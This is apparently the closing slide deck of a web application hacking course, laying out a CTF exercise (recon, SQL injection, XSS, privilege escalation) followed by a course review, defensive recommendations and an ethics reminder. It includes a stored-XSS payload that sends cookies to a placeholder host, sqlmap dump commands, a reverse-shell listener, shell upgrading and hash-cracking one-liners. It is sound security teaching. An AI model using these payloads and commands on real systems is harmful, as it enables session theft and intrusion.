# Final CTF Exercise & Course Wrap-Up

## Applying Everything You Have Learned

---

## CTF Overview

**Capture The Flag** - A hands-on exercise testing all skills learned:

- Multiple challenges of varying difficulty
- Each challenge contains a hidden flag
- Flags follow the format: `FLAG{description_here}`
- Time limit: 3 hours
- Work individually or in pairs
- Hints available (but cost points!)

---

## CTF Challenge Categories

| Category | Points | Skills Tested |
|----------|--------|--------------|
| **Reconnaissance** | 100 | Scanning, enumeration |
| **Web Exploitation** | 200 | SQLi, XSS, LFI |
| **Authentication** | 200 | Brute-force, bypass |
| **Privilege Escalation** | 300 | Post-exploitation |
| **Logic Flaws** | 200 | Business logic abuse |
| **Bonus** | 100 | Creative exploitation |

Total: **1100 points** available

---

## CTF Tips & Strategy

```misc
1. READ the challenge description carefully
2. Start with LOW-hanging fruit (easy challenges)
3. Take NOTES on everything you try
4. Don't get stuck - move to another challenge
5. Use your TOOLS (don't try to do everything manually)
6. Check for COMMON misconfigurations first
7. Think OUTSIDE the box for logic challenges
8. DOCUMENT your steps (needed for the report)

Time Management:
  First 30 min:  Scan everything, get the big picture
  Next 90 min:   Work through challenges systematically
  Last 60 min:   Focus on remaining flags + documentation
```

---

## CTF Methodology Reminder

![ctf_methodology_reminder](/svg/courses/security/web-application-hacking/21_ctf_and_wrapup/ctf_methodology_reminder.svg)

---

## Challenge 1: Reconnaissance (100 pts)

**Objective**: Find the hidden flag on the web server

Hints:
- Not all content is linked from the main page
- Check common files and directories
- Some files are meant to be hidden but aren't

```bash
# Tools to use:
gobuster dir -u http://TARGET -w common.txt -x txt,html,bak
curl http://TARGET/robots.txt
curl http://TARGET/.git/HEAD
```

---

## Challenge 2: SQL Injection (200 pts)

**Objective**: Extract the admin password from the database

Steps:
1. Find the injectable parameter
2. Determine the database type
3. Enumerate tables and columns
4. Extract the flag from the `flags` table

```bash
# Start testing
sqlmap -u "http://TARGET/page?id=1" --batch --dbs
sqlmap -u "http://TARGET/page?id=1" --batch -D ctfdb -T flags --dump
```

---

## Challenge 3: XSS (200 pts)

**Objective**: Steal the admin's cookie via stored XSS

Steps:
1. Find a page that stores and displays user input
2. Craft an `XSS` payload that sends cookies to your server
3. Trigger the admin bot to visit the page
4. Capture the admin's session cookie
5. Use the cookie to access the admin panel
6. Find the flag in the admin panel

```bash
# Start a listener
python3 -m http.server 8888

# XSS payload
<script>new Image().src='http://YOUR_IP:8888/?c='+document.cookie</script>
```

---

## Challenge 4: Authentication Bypass (200 pts)

**Objective**: Log in as admin without knowing the password

Possible attack vectors:
- `SQL injection` in login form
- Weak password / default credentials
- Password reset vulnerability
- `JWT` manipulation
- Authentication logic flaw

---

## Challenge 5: Privilege Escalation (300 pts)

**Objective**: Get root access and read `/root/flag.txt`

Steps:
1. Get initial access via web exploitation
2. Enumerate the system
3. Find a privilege escalation vector
4. Escalate to root
5. Read the flag

```bash
# After getting a shell:
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
./linpeas.sh
```

---

## Challenge 6: Logic Flaw (200 pts)

**Objective**: Purchase an item for free (or negative price)

Possible attack vectors:
- Price manipulation in requests
- Coupon/discount abuse
- Quantity manipulation
- Race condition on payment
- Workflow bypass

---

## Challenge 7: Bonus (100 pts)

**Objective**: Find the hidden flag using any creative method

This challenge requires thinking outside the box.
No specific hints - use everything you've learned!

---

## CTF Scoring

![ctf_scoring](/svg/courses/security/web-application-hacking/21_ctf_and_wrapup/ctf_scoring.svg)

---

## CTF Report Template

```markdown
# CTF Report - [Team Name]

## Challenge: [Name]
**Points**: [X]
**Category**: [Category]

### Discovery
How I found the vulnerability...

### Exploitation
Step-by-step exploitation:
1. First I...
2. Then I...

### Evidence
[Screenshots, command output, flag value]

### Remediation
How this vulnerability should be fixed:
- ...

### Flag
FLAG{the_flag_value}
```

---

## CTF Common Pitfalls

```misc
Things that waste time in CTFs:

1. Not reading the challenge description carefully
   - Hints are often embedded in the description

2. Overthinking simple challenges
   - Try the obvious first (admin:admin, robots.txt)

3. Not checking all ports
   - Always do a full port scan first

4. Forgetting to check page source
   - Comments, hidden fields, JavaScript variables

5. Not trying multiple injection points
   - Headers, cookies, ALL parameters

6. Tool misconfiguration
   - Wrong wordlist, missing cookies, wrong proxy

7. Not taking notes
   - Forget what you already tried
   - Can't reproduce findings

8. Tunnel vision
   - Stuck on one approach? Try something different
```

---

## Essential CTF One-Liners

```bash
# Quick port scan
nmap -sV -sC -p- --min-rate 5000 TARGET

# Find hidden content fast
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# Quick SQL injection test
sqlmap -u "http://TARGET/page?id=1" --batch --dbs

# Find all subdomains from cert transparency
curl -s "https://crt.sh/?q=%.TARGET.com&output=json" | jq -r '.[].name_value' | sort -u

# Reverse shell listener
nc -lvnp 4444

# Crack common hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Download file from target
curl http://TARGET/file -o file
wget http://TARGET/file

# Spawn TTY after getting shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Vulnerability Cheat Sheet Summary

![vulnerability_cheat_sheet_summary](/svg/courses/security/web-application-hacking/21_ctf_and_wrapup/vulnerability_cheat_sheet_summary.svg)

---

## Course Review: Day 1

Web Application (In)security & Mapping - Key takeaways:
- Web applications are the #1 attack vector
- Technology stack identification guides testing
- Burp Suite is the essential testing tool
- Content discovery finds hidden attack surface
- Every input is a potential entry point
- Systematic mapping beats random testing

---

## Course Review: Day 2

Authentication & Session Attacks + SQL Injection Basics - Key takeaways:
- Authentication flaws enable account takeover
- Password spraying and credential stuffing are effective
- Session management requires cryptographic randomness
- `CSRF` tokens prevent cross-site request forgery
- `SQL injection` remains the most impactful web vulnerability
- Parameterized queries are the primary defense

---

## Course Review: Day 3

Advanced SQL Injection & XSS - Key takeaways:
- `UNION`-based, blind, and time-based `SQL injection` techniques
- `sqlmap` automates detection and exploitation
- Filter bypass requires creative encoding
- Second-order injection is harder to detect
- `XSS` executes code in the victim's browser
- Context-aware output encoding prevents `XSS`
- `CSP` provides defense-in-depth

---

## Course Review: Day 4

Back-End Attacks, Logic Flaws & Hardening - Key takeaways:
- OS command injection gives full system access
- File path attacks read/write arbitrary files
- Deserialization is extremely dangerous
- Logic flaws require manual discovery
- Server hardening reduces the attack surface
- Defense in depth across all layers
- Logging and monitoring detect attacks

---

## Course Review: Day 5

Boot2Root & CTF - Key takeaways:
- Systematic methodology from scanning to root
- Chain multiple vulnerabilities for full compromise
- Privilege escalation exploits misconfigurations
- Persistence and pivoting extend access
- Documentation is critical for reporting
- CTF exercises test real-world skills

---

## Top 10 Defensive Recommendations

```misc
1.  Use parameterized queries for ALL database access
2.  Implement context-aware output encoding (XSS prevention)
3.  Enforce multi-factor authentication
4.  Apply the principle of least privilege everywhere
5.  Keep all software updated and patched
6.  Implement Content Security Policy headers
7.  Use Web Application Firewall as defense layer
8.  Enable comprehensive logging and monitoring
9.  Conduct regular penetration testing
10. Train developers in secure coding practices
```

---

## Security Testing Workflow - Summary

![security_testing_workflow_summary](/svg/courses/security/web-application-hacking/21_ctf_and_wrapup/security_testing_workflow_summary.svg)

---

## Continuing Your Learning

| Resource | Type | Focus |
|----------|------|-------|
| **PortSwigger Web Security Academy** | Free labs | Web vulnerabilities |
| **HackTheBox** | Platform | Realistic machines |
| **TryHackMe** | Platform | Guided learning |
| **OWASP Testing Guide** | Documentation | Methodology |
| **PentesterLab** | Exercises | Specific techniques |
| **Bug Bounty Programs** | Real-world | Production apps |

---

## Certifications Path

```misc
Entry Level:
  CompTIA Security+
  eJPT (eLearnSecurity)

Intermediate:
  CEH (Certified Ethical Hacker)
  CompTIA PenTest+
  eWPT (Web App Pentesting)

Advanced:
  OSCP (Offensive Security)
  GWAPT (GIAC Web App Pentester)
  eWPTX (Advanced Web App Pentesting)

Expert:
  OSWE (Web Expert)
  OSCE3 (Offensive Security)
  GXPN (GIAC Exploit Researcher)
```

---

## Professional Pentesting Reporting

```misc
Executive Summary:
  - Overall risk rating
  - Key findings (3-5 bullet points)
  - Business impact assessment

Technical Findings:
  For each vulnerability:
  - Title and severity (CVSS score)
  - Description
  - Affected components
  - Steps to reproduce
  - Evidence (screenshots, requests/responses)
  - Impact analysis
  - Remediation recommendations

Methodology:
  - Tools used
  - Testing approach
  - Scope and limitations

Appendices:
  - Full scan results
  - Raw data
  - Remediation priority matrix
```

---

## Final Thoughts

- **Authorization first** - Never test without written permission
- **Think like an attacker** - But act like a professional
- **Defense is the goal** - We break things to make them stronger
- **Stay current** - New vulnerabilities emerge constantly
- **Practice regularly** - Skills deteriorate without practice
- **Share knowledge** - Help others learn to build a safer web
- **Be ethical** - The trust placed in pentesters is sacred

---

## Thank You

### Web Application Hacking Course Complete

Key skills acquired:
- Web application reconnaissance and mapping
- Authentication and session attack techniques
- `SQL injection` detection and exploitation
- `XSS` discovery and exploitation
- Back-end attack techniques
- Privilege escalation methodology
- Server hardening best practices
- Professional reporting

> Keep practicing, stay curious, and hack responsibly.
